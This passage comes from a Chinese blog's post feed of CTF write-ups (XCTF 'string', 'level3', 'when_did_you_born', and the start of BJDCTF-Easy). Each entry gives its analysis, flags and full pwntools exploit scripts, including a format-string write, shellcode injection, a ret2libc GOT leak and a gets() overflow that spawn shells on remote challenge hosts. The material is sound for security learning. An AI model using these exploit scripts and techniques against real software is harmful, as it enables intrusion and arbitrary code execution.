href="https://adworld.xctf.org.cn/media/file/task/1d3c852354df4609bf8e56fe8e9df316">攻防世界-string</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/134UYx6CjLkwlKJ.png" alt="攻防世界-string1.png"><br>64位 小端序，开启了金丝雀、栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/i7RnDk38zyJPtSa.png" alt="攻防世界-string2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/bJ1ielpYM9Fv6VW.png" alt="攻防世界-string3.png"><br>跟进函数 <code>sub_400996()</code>：<br><img src="https://s2.loli.net/2023/03/18/Mh7lkUyR5ZxzJcH.png" alt="攻防世界-string4.png"><br>只是两句输出<br>跟进 <code>sub_400D72()</code>：<br><img src="https://s2.loli.net/2023/03/18/ca97hQg5RCLYmwz.png" alt="攻防世界-string5.png"><br>首先让用户输入角色名字，名字的长度被限制在 12 以内<br>跟进 <code>sub_400A7D()</code>：<br><img src="https://s2.loli.net/2023/03/18/AVx6c8hbM2QdKJf.png" alt="攻防世界-string6.png"><br>首先是讲故事，之后必须输入 <code>&quot;east&quot;</code> 才能跳出 <code>while(1)</code> 循环，而跳出 <code>while</code> 循环就不会执行后面的 <code>if</code> 语句<br>跟进 <code>sub_4009DD()</code>：<br><img src="https://s2.loli.net/2023/03/18/TvP2kG4QCc1sAmq.png" alt="攻防世界-string7.png"><br>会用 <code>while(1)</code> 循环不停的生成随机数，让用户去输入进行躲避，但是一旦输入错误一次跳出循环之后就 dead，貌似是条死路</p></li><li><p>回到 <code>sub_400D72()</code> 继续往下跟进 <code>sub_400BB9()</code>：<br><img src="https://s2.loli.net/2023/03/18/xTRsk6rbtF9nKz3.png" alt="攻防世界-string8.png"><br>首先是一段剧情，如果用户输入 “1”，会让用户继续输入地址、愿望，然后会将用户输入的愿望打印出来</p></li><li><p>回到 <code>sub_400D72()</code> 继续往下跟进 <code>sub_400CA6()</code>：<br><img src="https://s2.loli.net/2023/03/18/sak7Zt5LUi3XjgP.png" alt="攻防世界-string9.png"><br>注意到 if 语句 <code>if ( *a1 == a1[1] )</code>，这里的 <code>a1</code> 就是前面 <code>main()</code> 函数中定义的 <code>v4</code><br>也就是说要让 <code>*v4 == v4[1]</code><br>但 <code>main()</code> 函数中定义的是 <code>*v4 = 68   v4[1] = 85</code>，因此这里肯定是需要进行数据修改的<br>通过 if 语句后，会执行 <code>mmap()</code> 函数，通过 <code>v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL)</code> 将 <code>v1</code> 定义为一个函数，然后通过 <code>read()</code> 函数写入 <code>v1()</code> 的内容，最后通过 <code>(v1)(0LL)</code> 将写入的 <code>v1()</code> 函数执行</p></li><li><p>于是分析如下：<br> ① 程序刚开始前面有几个输入是固定的，程序想要继续执行就必须这么输入<br> ② 现在的问题在于如何去修改数据让 <code>*v4 == v4[1]</code><br> ③ 由于在 <code>main()</code> 函数中，<code>&quot;secret[0] is %x\n&quot;</code> 和 <code>&quot;secret[1] is %x\n&quot;</code> 两句会打印出 <code>*v4</code> 和 <code>v4[1]</code> 的地址<br> ④ 同时，在 <code>sub_400BB9()</code> 函数中，会要求输入字符串 <code>format</code>，后面又会用 <code>printf(format)</code> 进行打印<br>因此，可以利用这个输入的字符串 <code>&quot;%s&quot;</code> 来构造格式化字符串漏洞<br> ⑤ 将 <code>format</code> 输入为 <code>%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__</code> 可以让 <code>printf()</code> 函数实现 <code>printf(&quot;%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__&quot;)</code> 的操作，可以将栈中的其他数据也给打印出来<br> ⑥ 正好前面还要求输入地址，这个地址随便输入一个显眼的数，这样就可以通过 <code>printf()</code> 打印出的结果来找到这个数，从而判断出刚刚输入的地址在栈中的位置了<br> ⑦ 于是，当要求输入地址的时候，如果将 <code>*v4</code> 的地址给输进去，这样就知道 <code>*v4</code> 的地址在栈里的位置了，再通过格式化字符串漏洞将这个地址上的数据给修改掉，就可以实现改变 <code>*v4</code> 的值了<br> ⑧ 将  <code>*v4</code> 修改为 85 后，就可以通过  <code>sub_400CA6()</code> 函数中的 if 判断了<br> ⑨ 之后程序会要求输入 <code>v1</code>，然后将 <code>v1</code> 作为函数来执行，那么可以向 <code>v1</code> 中写入 <code>shellcode</code>，这样程序一执行就会实现 <code>system(&quot;/bin/sh&quot;)</code> 的操作</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./string"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">60038</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>    v4_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的伪代码，这里“secret[0] is ”后面输出的是v4: v4[0]所在的地址</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What should your character's name be:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 没有漏洞，随便输入即可</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的逻辑，必须这么输入</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的逻辑，必须这么输入</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    io.recvuntil("'Give me an address'\n")    io.sendline("1")  # 先随便给出一个地址，等下通过格式化字符串漏洞泄露出栈中的数据，来查看这个地址在栈中的位置    io.recvuntil("And, you wish is:\n")    io.sendline("%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__")  # 将这一串作为printf()的参数泄露栈中的数据    print(io.recv())  # 将泄露出的数据打印出来    """</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 用pwntools生成默认的shellcode，执行该shellcode等价于执行了system("/bin/sh")</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将v4[0]的地址发过去，通过前面的操作已经知道发过去的V4[0]的位置在栈中的第7位</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%85d%7$n"</span><span class="token punctuation">)</span>  <span class="token comment"># 向第7个参数写入85，即: 将v4[0]的值由68修改为85，这样就实现了v4[0] == v4[1]，可以通过sub_400CA6()中的if语句</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{a6bb09f8f19f8adfa1e160e67269416d}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/A9WfLIcFab1D6ZH.png" alt="攻防世界-string10.png"><br>根据输入的 <code>&quot;1&quot;</code>，用 <code>&quot;%p&quot;</code> 泄露出输入的值在栈中的位置，这里可以看到 <code>&quot;1&quot;</code> 在第 7 位</p><p><img src="https://s2.loli.net/2023/03/19/zVpQ1OuosTbwvRj.png" alt="攻防世界-string11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-level3</title>
      <link href="/2023/03352be797.html"/>
      <url>/2023/03352be797.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>当 <code>elf</code> 文件中没有给出 <code>system()</code> 函数和字符串 <code>&quot;/bin/sh&quot;</code> 的地址时，如果给出了一个库文件 <code>libc</code>，可以通过库文件来确定基地址，然后根据基地址反向推出 <code>elf</code> 文件中的 <code>system()</code> 函数以及 <code>&quot;/bin/sh&quot;</code> 的地址</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4005b2fef2a24a89963f0bfdcac9d0f3.gz">攻防世界-level3</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>得到一个可执行文件和一个 32位 库文件：<br><img src="https://s2.loli.net/2023/03/18/nVrOPSpBNofJsq9.png" alt="攻防世界-level3 1.png"><br>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/XCFYTUyaOHfv7rm.png" alt="攻防世界-level3 2.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试运行：<br><img src="https://s2.loli.net/2023/03/18/aB7YbFKDoLIeRgh.png" alt="攻防世界-level3 3.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/4Z5xK7yQcSPGqe9.png" alt="攻防世界-level3 4.png"><br>进入漏洞函数 <code>vulnerable_function()</code>：<br><img src="https://s2.loli.net/2023/03/18/IcjwQriYbuV9ysH.png" alt="攻防世界-level3 5.png"><br>查看 <code>buf</code> 所在位置：<br><img src="https://s2.loli.net/2023/03/18/W2EIuOvHKwc6ND5.png" alt="攻防世界-level3 6.png"><br><code>buf</code> 在栈中的长度为 0x88，但可以通过 <code>read()</code> 输入的长度为 0x100，存在溢出点</p></li><li><p>查看字符串：<br><img src="https://s2.loli.net/2023/03/18/CqrvgXbk6QZ7yiA.png" alt="攻防世界-level3 7.png"><br>本题没有 <code>&quot;/bin/sh&quot;</code>，也无法向段中写入数据<br>在 IDA 中查看函数：<br><img src="https://s2.loli.net/2023/03/18/c7oIdQXA2fWjlHK.png" alt="攻防世界-level3 8.png"><br>发现本题没有给出 <code>system()</code> 函数</p></li><li><p>但是由于本题给出了一个 32位 库文件，结合题目给出的提示，通过该 <code>libc</code> 库文件入手；<br>同时，根据题目提示，程序中没有现成的 <code>system()</code> 函数，这就需要我们从 <code>libc</code> 中动态加载 <code>system()</code> 函数<br><strong>由于 <code>PIE</code> 没有开启，也就是说程序地址不是随机化的</strong>，那么在 <code>libc</code> 中函数的偏移地址就是固定的，只要确定了 <code>libc</code> 的基地址，然后计算出 <code>system()</code> 函数的偏移地址，就可以定位到 <code>system()</code> 函数的真实地址，实现调用</p></li><li><p><mark><code>libc</code> 中的函数的相对地址是固定的</mark>，要想获取到 <code>system()</code> 函数的地址，可以通过 <code>write()</code> 函数进行 <code>offset</code> 计算：</p><ol><li>首先利用 <code>write()</code> 函数计算出 <code>write()</code> 函数的真实地址</li><li>利用相对 <code>offset</code> 计算出 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的真实地址</li></ol></li><li><p>先使用 <code>write()</code> 泄露 <code>got</code> 表中的地址，计算出 <code>libc</code> 的基地址，调用完成之后返回到 <code>vulnerable_function()</code>，计算出 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 在内存中的地址，然后再进行一次栈溢出调用 <code>system(&quot;/bin/sh&quot;)</code> 即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token comment"># elf</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3/level3"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>elf_main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中main函数的地址</span>elf_write_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中write函数在PLT表中的地址</span>elf_write_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中write函数在GOT表中的地址</span><span class="token comment"># libc</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3/libc_32.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成libc对象</span>libc_write_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取libc库中的write函数的地址</span>libc_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取libc库中的system函数的地址</span>lib_bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 在libc库中搜索"/bin/sh"字符串的地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level3/level3"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">63027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_write_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_main_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_write_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 接收数据: write函数在elf文件中的地址</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write_addr: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将此地址打印出来(每次执行结果不一样)</span>    base_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc_write_addr  <span class="token comment"># 根据elf文件中的write_addr计算得到基地址</span>    system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc_system_addr  <span class="token comment"># 根据基地址base_addr计算得到elf文件中system函数地址</span>    bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_bin_sh_addr  <span class="token comment"># 根据基地址base_addr计算得到elf文件中"/bin/sh"的地址</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 得到了函数在elf文件中的真实地址后，按照以往的正常调用方式来写即可</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个垃圾字符平衡栈，使"/bin/sh"作为system函数的参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{ee17c7e9631b2894da88efa5205b4a8c}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/wrTLBbG7EskmUNl.png" alt="攻防世界-level3 9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-when_did_you_born</title>
      <link href="/2023/03d46e25a2.html"/>
      <url>/2023/03d46e25a2.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 <mark>查看文件信息</mark>、<mark>查看文件保护</mark>等操作</p></li><li><p>了解 <mark><code>get()</code> 函数的漏洞</mark>，熟悉 <mark>exp 的写法</mark></p></li><li><p><em><strong>熟悉文件与栈的结构：</strong></em></p><ol><li><mark>在真实的 <code>elf</code> 文件中，是小地址在上，大地址在下，栈中的数据往上覆盖</mark></li><li><mark>在 <code>IDA</code> 中出于人性化考虑，栈的数据设计为小地址在下，大地址在上，因此栈中的数据往下覆盖</mark></li></ol></li></ul><hr><p><a href="https://pan.baidu.com/s/1eT_oVeEKPts8Lw2P0nDEnw&password==1axx">攻防世界-when_did_you_born</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载得到一个可执行的 elf 文件，在 Ubuntu 下查看文件信息：<code>file &lt;文件名&gt;</code><br><img src="https://s2.loli.net/2023/03/18/OwWI6M14XhKiojr.png" alt="攻防世界-when_did_you_born1.png"><br>其中，<strong>ELF 64-bit</strong> 代表该文件是 <em>64位 elf 文件</em>，<strong>LSB</strong> 代表<em>文件小端序</em>，<strong>executable</strong> 代表<em>可执行的文件</em></p></li><li><p>检查文件保护：<br><img src="https://s2.loli.net/2023/03/18/nG48yLrAksjoMbu.png" alt="攻防世界-when_did_you_born2.png"><br>开启了金丝雀（Canary），且栈不可执行</p></li><li><p>尝试执行该文件，测试功能：<br><img src="https://s2.loli.net/2023/03/18/hVUBDgX8pQLs25K.png" alt="攻防世界-when_did_you_born3.png"><br>程序有两个输入，一个输入生日，一个输入姓名，然后输出其他信息</p></li><li><p>尝试恶意输入：<br><img src="https://s2.loli.net/2023/03/18/9KUIBVrACHSuaxi.png" alt="攻防世界-when_did_you_born4.png"><br>出现溢出</p></li><li><p>拖入 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/1kD4BoW78hRdtgG.png" alt="攻防世界-when_did_you_born5.png"><br>根据函数的逻辑，用户先输入生日 <code>v5</code>，如果输入 <code>1926</code> 就输出 <code>&quot;You Cannot Born In 1926!&quot;</code>，否则，让用户继续输入姓名 <code>v4</code>，如果 <code>v5 == 1926</code> 就输出 <code>&quot;cat flag&quot;</code><br>但是前面又要求 <code>v5 != 1926</code>，因此这里应该是<mark>利用 <code>gets()</code> 函数不限制输入长度的特点，让 <code>v4</code> 输入垃圾字符覆盖掉栈中的数据，从而实现修改 <code>v5</code> 的值</mark></p></li><li><p>确定数据在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/oxkHp9JItfT3MRU.png" alt="攻防世界-when_did_you_born6.png"></p></li><li><p>需要先从 0x20 的地址覆盖到 0x18 的地址，最后再输入一个 1926 用来覆盖 <code>v5</code>，即可实现<br><code>b&#39;a&#39; * (0x20 - 0x18)</code> 表示输入 (0x20 - 0x18) 个字符 <code>&#39;a&#39;</code> 字节，<code>p64(1926)</code> 表示将 1926 打包成 64位 数据<br>编写 exp 即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{d941686b2efe84df967c1adf72cb4549}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/Bu3CMFSqZRLdYQW.png" alt="攻防世界-when_did_you_born7.png"><br>输出了：<code>You Shall Have Flag.</code><br>执行到：<code>cat: flag: 没有那个文件或目录</code><br>程序已经 PWN 通，只是调用的是本地的主机中的 <code>cat</code> 指令，由于本地没有 flag 文件，所以访问不到<br>将脚本中的 content 改为 0 即可 PWN 远程靶机，执行远程主机的 <code>cat</code> 指令</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-Easy</title>
      <link href="/2023/03b789347b.html"/>
      <url>/2023/03b789347b.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>OllyDBG 动态调试</p></li><li><p><mark>当 main 中没有与 flag 有关的信息时，寻找其他可能与 flag 相关的函数</mark></p></li><li><p><mark>C 语言获取数据 高位 和 低位 的方法</mark>：<code>#include&lt;windows.h&gt;</code></p></li></ul><pre class="language-c" data-language="c"><code class="language-c">LOWORD      取 <span class="token number">32</span> bits 低 <span class="token number">16</span> bitsHIWORD      取 <span class="token number">32</span> bits 高 <span class="token number">16</span> bitsLOBYTE      取 <span class="token number">16</span> bits 低 <span class="token number">8</span> bitsHIBYTE      取 <span class="token number">16</span> bits 高 <span class="token number">8</span> bits</code></pre><hr><p><a href="https://www.ctfer.vip/problem/702">BJDCTF-Easy</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 main 函数中未发现与 flag 有关的信息<br><img src="https://s2.loli.net/2023/03/18/KALw8JgVrnPT1pt.png" alt="BJDCTF-Easy1.png"><br>设置时间，并将时间分解为 tm 结构，赋值给 v5，但是 v5 也没有使用<br>查看字符串也没有与 flag 有关的信息<br><img src="https://s2.loli.net/2023/03/18/4mO3PB6yKFMpsHi.png" alt="BJDCTF-Easy2.png"></p></li><li><p><em><strong>依次查看其他的函数，发现大部分函数都是调用系统函数或是没有什么实际用处的函数，只有 <code>__ques</code> 函数的内容看起来不是没用的函数，比较正常</strong></em><br><img src="https://s2.loli.net/2023/03/18/syCr6Q5eSm3JqgW.png" alt="BJDCTF-Easy3.png"></p></li><li><p>同时，在 <code>__ques</code> 函数中，包含打印操作：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// '*'</span>          <span class="token operator">++</span>v7<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// ' '</span>        <span class="token operator">++</span>v7<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v7 <span class="token operator">%</span> 